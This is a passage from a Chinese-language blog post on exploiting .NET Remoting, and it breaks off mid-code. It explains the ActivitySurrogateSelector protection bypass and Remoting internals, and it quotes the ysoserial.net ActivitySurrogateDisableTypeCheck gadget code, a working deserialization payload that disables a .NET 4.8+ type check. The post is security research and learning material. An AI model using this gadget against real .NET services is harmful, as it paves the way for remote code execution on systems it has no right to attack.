<!DOCTYPE html>
<head>
    

<meta charset="utf-8">
<meta name="copyright" content="BASE">
<title>Siebene@ Blog</title>

<link rel='icon' type='image/png' href='/images/logo.png' />
<link rel='apple-touch-icon' sizes='180x180' href='/images/logo.png' />
<link rel='apple-touch-icon-precomposed' href='/images/logo.png' />


<link rel='canonical' href='/' />



<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0">


<meta http-equiv="X-UA-Compatible" content="IE=8 ; IE=9">
<meta name="description" content="New &amp; Used Clothing / Design Office" />
<meta name="keywords" content="Siebene@ Blog,Siebene@,siebene@" />
<meta property="fb:app_id" content="350947278320210" />
<meta property="og:description" content="Siebene@ Blog" />
<meta property="og:title" content="Siebene@ Blog " />
<meta property="og:image" content="/images/f13bd126bc74fa5060f7ba8e569f76c0.gif" />
<meta property="og:url" content="/" />
<meta property="og:site_name" content="Siebene@ Blog " />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@Siebene7" />
<meta name="twitter:url" content="/" />
<meta name="twitter:title" content="Siebene@ Blog " />
<meta name="twitter:description" content="Siebene@ Blog" />
<meta name="twitter:image" content="/images/f13bd126bc74fa5060f7ba8e569f76c0.gif" />


<link rel="stylesheet" type="text/css" href="/css/search.css">

<link href='https://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>

<link rel="stylesheet" type="text/css" href="/css/base.css">
<link rel="stylesheet" type="text/css" href="/css/windows.css">
<link rel="stylesheet" type="text/css" href="/css/BASEshop-24515246fb087d964f79.css"/>
<link rel="stylesheet" type="text/css" href="/css/github-markdown.css">

<style type="text/css">
body { 
        background-image: url("/images/bg.avif");     
        background-size: cover;
        background-attachment: fixed;
        background-repeat: no-repeat;
    }
</style>

<!-- metaCSS -->
<style type="text/css">
    .fontsize24 {
        font-size: 24px;
    }
    .fontsize28 {
        font-size: 28px;
    }
    .fontsize32 {
        font-size: 32px;
    }
    .fontsize36 {
        font-size: 36px;
    }
    .fontsize40 {
        font-size: 40px;
    }
    #logo.mincho, #windowHeader h1.mincho {
        font-family: "Hiragino Mincho ProN","Hiragino Mincho Pro",HGS明朝E,メイリオ,Meiryo,serif!important;
    }
    #logo.gothic, #windowHeader h1.gothic {
        font-family: 'Hiragino Kaku Gothic ProN','ヒラギノ角ゴ ProN W3',Meiryo,メイリオ,Osaka,'MS PGothic',arial,helvetica,sans-serif!important;
    }

    .appsItemCategoryTag_lowerLink {
        color: #1E2A86;
    }
        
    .logo_window h1 { font-family: 'Lato'; }
    .sp_logo h1 { font-family: 'Lato'; }
    
    /* ウィンドウヘッダーカラー */
    .window_header{
        background: navy;
    }
    .item_box section a {
        border-top: 24px solid navy;
    }
    @media screen and (max-width: 896px) {
        .item_box section a {
            border-top: none;
        }
    }
    .item_window_header{
    background: navy;
    }
</style>

<link rel="stylesheet" type="text/css" href="/css/label.css">

<meta name="cot:primaryColor" content="#000000">
<meta name="cot:accentColor" content="#000000">
<meta name="cot:textColor" content="#000000">
<meta name="cot:lightTextColor" content="#ffffff">
<meta name="cot:complementaryColor" content="#1E2A86">
<meta name="cot:titleColor" content="#000000">


<script src='/js/jquery.min.js'></script>
<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div class="page">
    <div id="rightbar">
        <div class="sp sp_logo">
            <h1 class="fontsize32"><a href="/" id="logo" class="nothing"><img class="logoImage"
                        src="/images/f13bd126bc74fa5060f7ba8e569f76c0.gif"
                        alt="Siebene@ Blog"></a></h1>
            <p class="tagline">おかえりなさい</p>
        </div>
        <!-- メニュー -->
        <div id="nav-drawer">
            <input id="nav-input" type="checkbox" class="nav-unshown">
                <label class="nav-unshown" id="nav-close" for="nav-input"></label>
                <label id="nav-open" for="nav-input">
                    <span></span>
                </label>

            <div id="sideContainer">
                <div class="pc logo_window">
                    <div class="window_header">
                        <span>Siebene@ Blog</span>
                        <div class="window_close">
                            <span></span>
                        </div>
                    </div>
                    <h1 class="fontsize32">
                        <a href="/" id="logo" class="nothing"><img class="logoImage" src="/images/f13bd126bc74fa5060f7ba8e569f76c0.gif" alt="Siebene@ Blog">
                        </a>
                    </h1>
                    <p class="tagline">おかえりなさい</p>
                </div>

                <header id="windowHeader" class="hidden">
                    <div class="window_header">
                        <span>Menu</span>
                        <label for="nav-input">
                            <div class="window_close">
                                <span></span>
                            </div>
                        </label>
                    </div>

                    <div class="menu_window_container">
                        <div id="leftbar">
                            <div id="leftContent">
                                <nav id="global">
                                    <ul>
                                        <li id="home"><a class="mainHeaderNavColor" href="/">HOME</a></li>
                                        <li><a class="mainHeaderNavColor" href="/about">ABOUT</a></li>
                                        <li></li>
                                        <li class="languageSelect">
                                            <div id="i18" class="clearfix">
                                            </div>
                                        </li>
                                        <li class="sp"><a class="windowFooterNav" href="/">Privacy Policy</a></li>
                                        <li class="sp"><a class="windowFooterNav" href="/">Act on Specified Commercial Transactions</a></li>
                                    </ul>
                                </nav>
                            </div>
                        </div>
                    </div>
                </header>
            </div>
        </div>
        
        <div id="item_page_wrap">
            <section class="radius_box">
                <div id="second_column">
                    <div class="window_header">
                        <span>Spec</span>
                        <div class="window_close"><span></span></div>
                    </div>
                    <div class="item_page_window_container">
                        <div id="item_detail">
                            <p>Learning-Exploit-of-NET-Remoting</p>
                            <br>
                            <p>2023-03-27</p>
                            <section class="markdown-body">
                                <h3 id="NET-Remoting-introduction"><a href="#NET-Remoting-introduction" class="headerlink" title=".NET Remoting introduction"></a>.NET Remoting introduction</h3><p>.NET Remoting是在.NET中用於遠程方法調用的內置架構</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-netod/bfd49902-36d7-4479-bf75-a2431bd99039">.NET Remoting</a>集成於.NET Framework中，允許所謂的遠程調用方法。客戶端和服務器之間支持的傳輸包括HTTP、IPC(命名管道)和TCP</p>
<p>以下是一個簡單的例子以進行說明：服務器創建並註冊傳輸服務器通道，然後將該類別註冊為服務</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> channel = <span class="keyword">new</span> TcpServerChannel(<span class="number">12345</span>);</span><br><span class="line">ChannelServices.RegisterChannel(channel);</span><br><span class="line">RemotingConfiguration.RegisterWellKnownServiceType(</span><br><span class="line">    <span class="keyword">typeof</span>(xxx),</span><br><span class="line">    <span class="string">&quot;name&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>客戶端只需要知道服務的URL，就可以透過遠程調用在客戶端和伺服器之間進行通訊</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> remote = (MyRemotingClass)RemotingServices.Connect(</span><br><span class="line">    <span class="keyword">typeof</span>(xxx),</span><br><span class="line">    <span class="string">&quot;tcp://remoting-server:12345/name&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>.NET Remoting已於2009年隨著.NET Framework 3.0的發布而被棄用，並在.NET Core和.NET 5+中不再提供</p>
<h3 id="Bypass-DisableActivitySurrogateSelectorTypeCheck"><a href="#Bypass-DisableActivitySurrogateSelectorTypeCheck" class="headerlink" title="Bypass DisableActivitySurrogateSelectorTypeCheck"></a>Bypass DisableActivitySurrogateSelectorTypeCheck</h3><p>衆所周知，ActivitySurrogateSelector gadget可以加載DLL，利用了System.Workflow.ComponentModel中的ActivitySurrogateSelector類別</p>
<p>但在DotNet framework(4.8+)<a target="_blank" rel="noopener" href="https://github.com/microsoft/dotnet-framework-early-access/blob/master/release-notes/NET48/dotnet-48-changes.md">fixed</a>.</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">ObjectSurrogate</span> : <span class="title">ISerializationSurrogate</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext ctx</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!AppSettings.DisableActivitySurrogateSelectorTypeCheck &amp;&amp;</span><br><span class="line">            !(obj <span class="keyword">is</span> ActivityBind) &amp;&amp; !(obj <span class="keyword">is</span> DependencyObject))</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我們可以看到，對GetObjectData函數進行了類型檢查，確保只能處理ActivityBind或DependencyObject</p>
<p>同時引入了一個新選項(<strong>DisableActivitySurrogateSelectorTypeCheck</strong>)</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">internal</span> <span class="keyword">static</span> <span class="built_in">bool</span> DisableActivitySurrogateSelectorTypeCheck</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">get</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (NativeMethods.IsDynamicCodePolicyEnabled())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        AppSettings.EnsureSettingsLoaded();</span><br><span class="line">        <span class="keyword">return</span> AppSettings.disableActivitySurrogateSelectorTypeCheck;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新增了一個新的方法呼叫NativeMethods.IsDynamicCodePolicyEnabled，確保只有當WLDP(Windows Lockdown Policy)被啟用時，類型白名單才會強制實施。這裏不需要關注WLDP(Windows Lockdown Policy)。這個AppSettings.disableActivitySurrogateSelectorTypeCheck選項實際上對應到 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.configuration.configurationmanager.appsettings">ConfigurationManager.AppSettings</a>，通常指的是應用程式或web.config檔案中的策略</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NamedValueCollection collection = ConfigurationManager.AppSettings;</span><br><span class="line"><span class="built_in">bool</span>.TryParse(</span><br><span class="line">collection[<span class="string">&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;</span>],</span><br><span class="line"><span class="keyword">out</span> AppSettings.disableActivitySurrogateSelectorTypeCheck</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>也就是說其實只需要反序列化payload觸發如下調用關閉保護</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ConfigurationManager.AppSettings.Set(<span class="string">&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net/pull/41/files">TextFormattingRunProperties</a>就可以輕鬆做到</p>
<p><a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net/blob/d1ee10ddd08bbfdda3713b2f67a7d23cbca16f12/ysoserial/Generators/ActivitySurrogateDisableTypeCheck.cs">https://github.com/pwntester/ysoserial.net/blob/d1ee10ddd08bbfdda3713b2f67a7d23cbca16f12/ysoserial/Generators/ActivitySurrogateDisableTypeCheck.cs</a></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ysoserial.Generators</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">ActivitySurrogateDisableTypeCheckGenerator</span> : <span class="title">GenericGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">Name</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ActivitySurrogateDisableTypeCheck&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">Description</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ActivitySurrogateDisableTypeCheck Gadget by Nick Landers. Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">SupportedFormatters</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;BinaryFormatter&quot;</span>, <span class="string">&quot;ObjectStateFormatter&quot;</span>, <span class="string">&quot;SoapFormatter&quot;</span>, <span class="string">&quot;NetDataContractSerializer&quot;</span>, <span class="string">&quot;LosFormatter&quot;</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">object</span> <span class="title">Generate</span>(<span class="params"><span class="built_in">string</span> cmd, <span class="built_in">string</span> formatter, Boolean test</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> xaml_payload = <span class="string">@&quot;&lt;ResourceDictionary</span></span><br><span class="line"><span class="string">xmlns=&quot;&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;&quot;</span></span><br><span class="line"><span class="string">xmlns:x=&quot;&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;&quot;</span></span><br><span class="line"><span class="string">xmlns:s=&quot;&quot;clr-namespace:System;assembly=mscorlib&quot;&quot;</span></span><br><span class="line"><span class="string">xmlns:c=&quot;&quot;clr-namespace:System.Configuration;assembly=System.Configuration&quot;&quot;</span></span><br><span class="line"><span class="string">xmlns:r=&quot;&quot;clr-namespace:System.Reflection;assembly=mscorlib&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;ObjectDataProvider x:Key=&quot;&quot;type&quot;&quot; ObjectType=&quot;&quot;&#123;x:Type s:Type&#125;&quot;&quot; MethodName=&quot;&quot;GetType&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;ObjectDataProvider.MethodParameters&gt;</span></span><br><span class="line"><span class="string">            &lt;s:String&gt;System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&lt;/s:String&gt;</span></span><br><span class="line"><span class="string">        &lt;/ObjectDataProvider.MethodParameters&gt;</span></span><br><span class="line"><span class="string">    &lt;/ObjectDataProvider&gt;</span></span><br><span class="line"><span class="string">    &lt;ObjectDataProvider x:Key=&quot;&quot;field&quot;&quot; ObjectInstance=&quot;&quot;&#123;StaticResource type&#125;&quot;&quot; MethodName=&quot;&quot;GetField&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;ObjectDataProvider.MethodParameters&gt;</span></span><br><span class="line"><span class="string">            &lt;s:String&gt;disableActivitySurrogateSelectorTypeCheck&lt;/s:String&gt;</span></span><br><span class="line"><span class="string">            &lt;r:BindingFlags&gt;40&lt;/r:BindingFlags&gt;</span></span><br><span class="line"><span class="string">        &lt;/ObjectDataProvider.MethodParameters&gt;</span></span><br><span class="line"><span class="string">    &lt;/ObjectDataProvider&gt;</span></span><br><span class="line"><span class="string">    &lt;ObjectDataProvider x:Key=&quot;&quot;set&quot;&quot; ObjectInstance=&quot;&quot;&#123;StaticResource field&#125;&quot;&quot; MethodName=&quot;&quot;SetValue&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;ObjectDataProvider.MethodParameters&gt;</span></span><br><span class="line"><span class="string">            &lt;s:Object/&gt;</span></span><br><span class="line"><span class="string">            &lt;s:Boolean&gt;true&lt;/s:Boolean&gt;</span></span><br><span class="line"><span class="string">        &lt;/ObjectDataProvider.MethodParameters&gt;</span></span><br><span class="line"><span class="string">    &lt;/ObjectDataProvider&gt;</span></span><br><span class="line"><span class="string">    &lt;ObjectDataProvider x:Key=&quot;&quot;setMethod&quot;&quot; ObjectInstance=&quot;&quot;&#123;x:Static c:ConfigurationManager.AppSettings&#125;&quot;&quot; MethodName =&quot;&quot;Set&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;ObjectDataProvider.MethodParameters&gt;</span></span><br><span class="line"><span class="string">            &lt;s:String&gt;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&lt;/s:String&gt;</span></span><br><span class="line"><span class="string">            &lt;s:String&gt;true&lt;/s:String&gt;</span></span><br><span class="line"><span class="string">        &lt;/ObjectDataProvider.MethodParameters&gt;</span></span><br><span class="line"><span class="string">    &lt;/ObjectDataProvider&gt;</span></span><br><span class="line"><span class="string">&lt;/ResourceDictionary&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            TextFormattingRunPropertiesMarshal payload = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(xaml_payload);</span><br><span class="line">            <span class="keyword">return</span> Serialize(payload, formatter, test);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ConfigurationManager.AppSettings.Set(</span></span><br><span class="line"><span class="comment">//    &quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;,</span></span><br><span class="line"><span class="comment">//    &quot;true&quot;</span></span><br><span class="line"><span class="comment">//);</span></span><br><span class="line"><span class="comment">//But actually the reference made to ConfigurationManager.AppSettings only occurs if the internal //Workflow.ComponentModel.AppSettings has not yet been initialized</span></span><br><span class="line"><span class="comment">//so we must use System.Reflection calls using ObjectDataProviders to manually set the internal Workflow boolean //value.</span></span><br></pre></td></tr></table></figure>

<h3 id="Remoting-Internals"><a href="#Remoting-Internals" class="headerlink" title="Remoting Internals"></a>Remoting Internals</h3><p>在客戶端連接到由伺服器提供的遠端物件時，它會建立一個實作指定類別MyRemotingClass的RemotingProxy。所有遠端的方法呼叫（除了GetType()和GetHashCode()）都會以遠端呼叫的方式傳送到伺服器。當遠端的方法被呼叫時，代理會建立一個MethodCall物件，該物件包含方法和傳遞的參數的資訊，然後將其傳遞給chain of client sinks，以準備MethodCall並處理在給定傳輸上的遠端通訊</p>
<p>客戶端的默認chain of server sinks如下</p>
<p><a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#System.Runtime.Remoting/channels/http/httpclientchannel.cs,81c8871a37e3377d"><code>HttpClientChannel</code></a>:<br><code>SoapClientFormatterSink</code> → <code>HttpClientTransportSink</code></p>
<p><a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#System.Runtime.Remoting/channels/ipc/ipcclientchannel.cs,530f8ce9347cece7"><code>IpcClientChannel</code></a>:<br><code>BinaryClientFormatterSink</code> → <code>IpcClientTransportSink</code></p>
<p><a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#System.Runtime.Remoting/channels/tcp/tcpclientchannel.cs,a272730843ec7d2f"><code>TcpClientChannel</code></a>:<br><code>BinaryClientFormatterSink</code> → <code>TcpClientTransportSink</code></p>
<p>在伺服器端，接收到的請求也會傳遞給chain of server sinks，其中也包括MethodCall物件的反序列化。它以dispatcher sink結束，該調度器接收器使用傳遞的參數來呼叫方法的實際實作。方法呼叫的結果隨後放入MethodResponse物件中，並返回給客戶端，客戶端chain of client sinks會反序列化MethodResponse物件，提取返回的物件並將其傳回RemotingProxy</p>
<p>伺服器的默認chain of server sinks如下</p>
<p><a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#System.Runtime.Remoting/channels/http/httpserverchannel.cs,265b11b554421364"><code>HttpServerChannel</code></a>:<br><code>HttpServerTransportSink</code> → <code>SdlChannelSink</code> → <code>SoapServerFormatterSink</code> → <code>BinaryServerFormatterSink</code> → <code>DispatchChannelSink</code></p>
<p><a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#System.Runtime.Remoting/channels/ipc/ipcserverchannel.cs,b728af26d2a7aa81"><code>IpcServerChannel</code></a>:<br><code>IpcServerTransportSink</code> → <code>BinaryServerFormatterSink</code> → <code>SoapServerFormatterSink</code> → <code>DispatchChannelSink</code></p>
<p><a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#System.Runtime.Remoting/channels/tcp/tcpserverchannel.cs,4f428dc0d9ed3c75"><code>TcpServerChannel</code></a>:<br><code>TcpServerTransportSink</code> → <code>BinaryServerFormatterSink</code> → <code>SoapServerFormatterSink</code> → <code>DispatchChannelSink</code></p>
<p>默認伺服器chain可以處理兩種格式。只有在通道未使用明確的IClientChannelSinkProvider或IServerChannelSinkProvider創建時，才會使用默認chain</p>
<h3 id="MarshalByRefObject"><a href="#MarshalByRefObject" class="headerlink" title="MarshalByRefObject"></a>MarshalByRefObject</h3><p>如果類型擴展了MarshalByRefObject則表明為reference，該物件需要使用RemotingServices.Marshal進行marshal(編組)。該過程會將其注冊到當前的registry中，并且RemotingServices.Marshal將會返回ObjRef實例，這個實例持有關於編組物件的URL和類型信息</p>
<p>marshal的過程是透過RemotingSurrogate進行的，用於BinaryFormatter&#x2F;SoapFormatter中(<a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#mscorlib/system/runtime/remoting/remotingsurrogateselector.cs,aa81bb09f7251ff0"><code>RemotingSurrogate.GetSurrogate(Type, StreamingContext, out ISurrogateSelector)</code></a>，<a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#System.Runtime.Remoting/channels/core/corechannel.cs,a0599cfbe4a212bb"><code>CoreChannel.CreateSoapFormatter(bool, bool)</code></a>)</p>
<p>serialization surrogate允許自訂指定型別的序列化&#x2F;反序列化</p>
<p>對於擴展自MarshalByRefObject的物件，RemotingSurrogateSelector會返回RemotingSurrogate(<a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#mscorlib/system/runtime/remoting/remotingsurrogateselector.cs,aa81bb09f7251ff0"><code>RemotingSurrogate.GetSurrogate(Type, StreamingContext, out ISurrogateSelector)</code></a>)</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> ISerializationSurrogate <span class="title">GetSurrogate</span>(<span class="params">Type type, StreamingContext context, <span class="keyword">out</span> ISurrogateSelector ssout</span>)</span></span><br><span class="line">       &#123;        </span><br><span class="line">           <span class="keyword">if</span> (type == <span class="literal">null</span>)</span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           Contract.EndContractBlock();</span><br><span class="line">   </span><br><span class="line">           Message.DebugOut(<span class="string">&quot;Entered  GetSurrogate for &quot;</span> + type.FullName + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   </span><br><span class="line">           <span class="keyword">if</span> (type.IsMarshalByRef)</span><br><span class="line">           &#123;</span><br><span class="line">               Message.DebugOut(<span class="string">&quot;Selected surrogate for &quot;</span> + type.FullName);</span><br><span class="line">               ssout = <span class="keyword">this</span>;</span><br><span class="line">               <span class="keyword">return</span> _remotingSurrogate;</span><br><span class="line">           &#125;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>

<p>接下來按照.NET序列化機制，將會呼叫RemotingSurrogate.GetObjectData(Object, SerializationInfo, StreamingContext)，最終會進入到</p>
<p><a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#mscorlib/system/runtime/remoting/remotingservices.cs,55c26312d5a634b6">RemotingServices.MarshalInternal(MarshalByRefObject, string, Type)</a></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">internal</span> <span class="keyword">static</span> ObjRef <span class="title">MarshalInternal</span>(<span class="params">MarshalByRefObject Obj, String ObjURI, Type RequestedType, <span class="built_in">bool</span> updateChannelData, <span class="built_in">bool</span> isInitializing</span>)</span></span><br><span class="line">        &#123;     </span><br><span class="line">            BCLDebug.Trace(<span class="string">&quot;REMOTE&quot;</span>, <span class="string">&quot;Entered Marshal for URI&quot;</span> +  ObjURI + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">null</span> == Obj)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">            ObjRef objectRef = <span class="literal">null</span>;</span><br><span class="line">            Identity idObj = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">            idObj = GetOrCreateIdentity(Obj, ObjURI, isInitializing);</span><br><span class="line">    ......</span><br><span class="line">            TrackingServices.MarshaledObject(Obj, objectRef);                               </span><br><span class="line">            <span class="keyword">return</span> objectRef;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到最後<code>return objectRef</code>，意味著每個擴展自MarshalByRefObject的遠程物件都會返回為一個ObjRef</p>
<p>在接收方，如果發送方傳遞的是一個ObjRef，在反序列化過程中最終將呼叫ObjRef實現的<a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#mscorlib/system/runtime/remoting/objref.cs,0d7adb242327ecd2">IObjectReference.GetRealObject(StreamingContext)</a></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 